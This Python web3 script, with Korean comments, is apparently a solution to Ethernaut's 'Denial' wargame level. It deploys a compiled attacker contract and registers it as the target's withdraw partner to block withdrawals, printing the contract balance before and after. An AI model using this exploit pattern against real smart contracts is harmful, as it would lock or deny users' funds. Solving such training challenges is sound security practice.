from web3 import Web3
from solcx import compile_source
from dotenv import dotenv_values

# 풀이
# 1. 

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x700A1a868CA4CD1530f877B7B9f0745be63f30b5'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL20_ADDRESS']
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "receive",
        "stateMutability": "payable",
        "payable": True
    },
    {
        "type": "function",
        "name": "contractBalance",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x8b7afe2e"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x8da5cb5b"
    },
    {
        "type": "function",
        "name": "partner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0xbe10862b"
    },
    {
        "type": "function",
        "name": "setWithdrawPartner",
        "inputs": [
            {
                "name": "_partner",
                "type": "address",
                "internalType": "address"
            }
        ],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0x4e1c5914"
    },
    {
        "type": "function",
        "name": "withdraw",
        "inputs": [],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0x3ccfd60b"
    }
]

with open("./contract/DenialAttack.sol", "r") as f:
    ATTACKER_SRC_DATA = f.read()

COMPILED_SOL = compile_source(ATTACKER_SRC_DATA, optimize=False, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

ATTACKER_BYTECODE = contract_interface['bin']
ATTACKER_ABI = contract_interface['abi']

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(abi=ATTACKER_ABI, bytecode=ATTACKER_BYTECODE)

tx_hash = attacker.constructor(CONTRACT_ADDRESS).transact()

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

ATTACKER_ADDRESS = receipt.contractAddress

print("---- BEFORE TRANSACTION ----")

BEFORE_CONTRACT_BALANCE = contract.functions.contractBalance().call()

print(f"Current contract balance : {BEFORE_CONTRACT_BALANCE}\n")

tx = contract.functions.setWithdrawPartner(ATTACKER_ADDRESS).build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

tx = contract.functions.withdraw().build_transaction({
    "from": USER_ADDRESS,
    "gasPrice": web3.to_wei(0.000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

print("---- AFTER TRANSACTION ----")

AFTER_CONTRACT_BALANCE = contract.functions.contractBalance().call()

print(f"Current contract balance : {AFTER_CONTRACT_BALANCE}")